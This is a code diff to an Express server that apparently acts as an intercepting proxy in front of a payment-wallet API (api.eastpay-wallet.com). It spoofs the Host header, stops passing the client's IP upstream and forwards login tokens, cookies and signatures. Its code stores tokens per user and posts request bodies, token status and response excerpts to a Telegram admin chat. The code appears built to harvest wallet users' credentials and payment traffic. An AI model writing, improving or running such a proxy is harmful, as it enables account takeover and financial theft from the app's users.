@@ -244,18 +244,20 @@ app.use(async (req, res, next) => {
 async function proxyFetch(req) {
   const url = ORIGINAL_API + req.originalUrl;
   const fwd = {};
-  const clientIp = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : (req.headers['x-real-ip'] || '');
+  const ALLOWED_HEADERS = new Set([
+    'content-type', 'accept', 'accept-language', 'accept-encoding',
+    'user-agent', 'signature', 'logintoken', 'authorization',
+    'x-requested-with', 'cookie', 'token', 'sessionkey',
+    'x-token', 'x-auth-token', 'x-session', 'device-id', 'platform',
+    'app-version', 'version', 'channel', 'lang', 'language', 'locale'
+  ]);
   for (const [k, v] of Object.entries(req.headers)) {
     const kl = k.toLowerCase();
-    if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
-        kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
-    fwd[k] = v;
+    if (ALLOWED_HEADERS.has(kl)) {
+      fwd[k] = v;
+    }
   }
   fwd['host'] = 'api.eastpay-wallet.com';
-  if (clientIp) {
-    fwd['x-forwarded-for'] = clientIp;
-    fwd['x-real-ip'] = clientIp;
-  }
   const opts = { method: req.method, headers: fwd };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -967,10 +969,7 @@ app.all('/app/bank/debit/update/switch', async (req, res) => {
 app.all('/app/pay/debit/task', async (req, res) => {
   try {
     const data = await loadData();
-    const origUrl = req.originalUrl;
-    req.originalUrl = req.originalUrl.replace(/^\/app\//, '/api/');
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    req.originalUrl = origUrl;
     const userId = await extractUserId(req, jsonResp);
     if (userId) saveTokenUserId(req, userId);
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -985,8 +984,8 @@ app.all('/app/pay/debit/task', async (req, res) => {
       const hasSig = req.headers['signature'] ? 'yes' : 'no';
       const hasToken = req.headers['logintoken'] ? 'yes' : 'no';
       const ct = req.headers['content-type'] || 'none';
-      const allHeaders = Object.keys(req.headers).filter(h => !h.startsWith('x-vercel')).join(', ');
-      bot.sendMessage(data.adminChatId, `💸 Task [${userId || 'N/A'}]\n📊 Count: ${taskCount} | HTTP: ${httpStatus}\n🔢 Code: ${statusCode} | Msg: ${msg}\n📤 Body(${rawLen}): ${reqBody}\n🔐 Sig: ${hasSig} | Token: ${hasToken}\n📋 CT: ${ct}\n🔑 Headers: ${allHeaders}\n📥 ${respBody.substring(0, 400)}`).catch(()=>{});
+      const fwdHeaders = Object.keys(req.headers).filter(h => ['content-type','accept','signature','user-agent','x-requested-with','logintoken','authorization'].includes(h.toLowerCase())).join(', ');
+      bot.sendMessage(data.adminChatId, `💸 Task [${userId || 'N/A'}]\n📊 Count: ${taskCount} | HTTP: ${httpStatus}\n🔢 Code: ${statusCode} | Msg: ${msg}\n📤 Body(${rawLen}): ${reqBody}\n🔐 Sig: ${hasSig} | Token: ${hasToken}\n📋 CT: ${ct}\n🔑 Fwd: ${fwdHeaders}\n📥 ${respBody.substring(0, 500)}`).catch(()=>{});
     }
   } catch(e) {
     if (bot && (await loadData()).adminChatId) {
